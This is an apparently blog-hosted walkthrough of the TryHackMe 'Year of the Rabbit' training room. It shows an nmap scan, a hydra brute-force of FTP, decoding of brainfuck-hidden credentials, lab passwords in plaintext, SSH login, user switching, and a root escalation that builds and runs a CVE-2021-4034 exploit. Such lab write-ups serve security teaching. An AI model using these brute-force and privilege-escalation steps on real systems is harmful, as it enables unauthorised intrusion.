I"Ò+<p>This is the <a href="https://tryhackme.com/room/yearoftherabbit">tryhackme</a> room with difficult level <code class="language-plaintext highlighter-rouge">easy</code>.</p>

<h3 id="enumeration">Enumeration.</h3>
<ul>
  <li>-
    <h4 id="nmap-scanning">nmap scanning.</h4>
    <hr />
    <p><strong>Command.</strong></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> nmap -sC -sV 10.10.59.107 -oN nmap-scan 
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <hr />
    <p><strong>Results</strong>
```</p>
    <h1 id="nmap-792-scan-initiated-fri-may-20-223730-2022-as-nmap--sc--sv--on-nmap-scan-101059107">Nmap 7.92 scan initiated Fri May 20 22:37:30 2022 as: nmap -sC -sV -oN nmap-scan 10.10.59.107</h1>
    <p>Nmap scan report for 10.10.59.107
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p>
  </li>
</ul>

<p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</p>
<h1 id="nmap-done-at-fri-may-20-223815-2022--1-ip-address-1-host-up-scanned-in-4531-seconds">Nmap done at Fri May 20 22:38:15 2022 â€“ 1 IP address (1 host up) scanned in 45.31 seconds</h1>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>-- -
#### Burp-suit.
-- -
![](burp.png)
-- -
**Visit  the hidden directory**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>GET /intermediary.php?hidden_directory=/WExYY2Cv-qU</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>Then navigate to ``http://thm-machine-ip/WExYY2Cv-qU/``
-- -
This will lead us to the directory which has an image named as ``Hot_Babe.png.`` I renamed it to `bae.png.`
![](bae.png)
-- -
**Checking if there is any message in the image.**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>â”Œâ”€â”€(egovridcã‰¿egovridc)-[~/C7F5/thm/yearOfrabbit]
â””â”€$ strings bae.png</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>We found a message as shown below.
-- -

&gt;[!note] message from image
&gt;Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:

-- -
### Brute-force ftp password.
</pre></td></tr></tbody></table></code></pre></div></div>
<p>â”Œâ”€â”€(egovridcã‰¿egovridc)-[~/C7F5/thm/yearOfrabbit]
â””â”€$ hydra -l ftpuser -P â€œftp-passwdsâ€ -s 21 -o â€œftp-resultsâ€ ftp://10.10.59.107</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>**Result.**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>password: 5iez1wGXKfPKQ</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>-- -
### Login to ftp server.
-- -
</pre></td></tr></tbody></table></code></pre></div></div>
<p>â”Œâ”€â”€(egovridcã‰¿egovridc)-[~/C7F5/thm/yearOfrabbit]
â””â”€$ ftp 10.10.59.107
Connected to 10.10.59.107.
220 (vsFTPd 3.0.2)
Name (10.10.59.107:egovridc): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>-- -
**List ftp files.**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>ftp&gt; ls 
229 Entering Extended Passive Mode (|||33780|).
150 Here comes the directory listing.
-rw-râ€“râ€“    1 0        0             758 Jan 23  2020 Eliâ€™s_Creds.txt
226 Directory send OK.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>-- -
**Download  Eli's_Creds.txt from ftp server.**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>ftp&gt; get Eliâ€™s_Creds.txt
local: Eliâ€™s_Creds.txt remote: Eliâ€™s_Creds.txt
229 Entering Extended Passive Mode (|||12303|).
150 Opening BINARY mode data connection for Eliâ€™s_Creds.txt (758 bytes).
100% |<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong>*|   758      622.04 KiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (4.46 KiB/s)
ftp&gt;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>-- -
**Reading Eli's_Creds.txt.**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>â”Œâ”€â”€(egovridcã‰¿egovridc)-[~/C7F5/thm/yearOfrabbit]
â””â”€$ cat Eli's_Creds.txt 
+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ +.&lt;++ +[-&gt;-
â€“&lt;]&gt; â€”â€“ .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++.&lt; +++++ ++[-&gt; â€”â€“ â€“&lt;]&gt; â€”â€“ â€“.&lt;+
++++[ -&gt;â€” â€“&lt;]&gt; -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ .++++ +++.- â€“.&lt;+
+++++ +++[- &gt;â€”- â€”â€“ &lt;]&gt;â€“ â€”â€“ â€”-. â€”.&lt; +++++ +++[- &gt;++++ ++++&lt;
]&gt;+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.. ++++. â€”â€“ â€”.+
++.&lt;+ ++[-&gt; â€”&lt;] &gt;â€”- -.&lt;++ ++++[ -&gt;â€” â€”&lt;] &gt;â€”- â€“.&lt;+ ++++[ -&gt;â€”
â€“&lt;]&gt; -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ +.&lt;++ +++[- &gt;++++
+&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- â€”â€“ &lt;]&gt;â€“ â€”â€“ -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;+.&lt;+
++++[ -&gt;â€” â€“&lt;]&gt; â€”.&lt; +++++ [-&gt;â€“ â€”&lt;] &gt;â€”. &lt;++++ ++++[ -&gt;+++ +++++
&lt;]&gt;++ ++++. &lt;++++ +++[- &gt;â€”- â€”&lt;] &gt;â€”- -.+++ +.&lt;++ +++++ [-&gt;++ +++++
&lt;]&gt;+. &lt;+++[ -&gt;â€” &lt;]&gt;â€“ â€”.- â€”-. &lt;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>-- -
The file is obfuscated  with brainfuck, so i decided to use online [brainfuck](https://www.dcode.fr/brainfuck-language) tool to decrypt.
-- -
**Results**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>User: eli
Password: DSpDiM1wAEwid</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>-- -
### Login into Eli's machine by using ssh.
-- -
**ssh**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>â”Œâ”€â”€(egovridcã‰¿egovridc)-[~/C7F5/thm/yearOfrabbit]
â””â”€$ ssh eli@10.10.59.107</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>-- -
&gt;[!FAQ] message from root
&gt;1 new message
&gt;
&gt;Message from Root to Gwendoline:
&gt;"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
&gt;
&gt;END MESSAGE
-- - 
### User privilege escalation.
-- -
#### Find secret message from root.
-- - 
**s3cr3t**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>eli@year-of-the-rabbit:~$ find /  -name <em>s3cr3t</em> 2&gt;/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>-- -
**Reading the file.**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!</p>

<p>Yours sincerely
   -Root</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>It contains password for user gwendoline.
-- -
**Switch to user gwendoline.**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendoline
Password: 
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ whoami
gwendoline</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>-- -
### Root privilege escalation.
-- -
`CVE-2021-4034`
Send the files to the victim machine and run `make` then `exploit`
Results.
-- -
**Root user**
</pre></td></tr></tbody></table></code></pre></div></div>
<p>gwendoline@year-of-the-rabbit:~$ make
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
gwendoline@year-of-the-rabbit:~$ ls
evil.so  evil-so.c  exploit  exploit.c  Makefile  user.txt
gwendoline@year-of-the-rabbit:~$ ./exploit</p>
<h1 id="cd-root">cd /root</h1>
<h1 id="ls">ls</h1>
<p>root.txt</p>
<h1 id="cat-roottxt">cat root.txt</h1>
<p>THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
#
```
â€“ -
<strong>End.</strong>
Relate [[Chill Hack]]</p>
:ET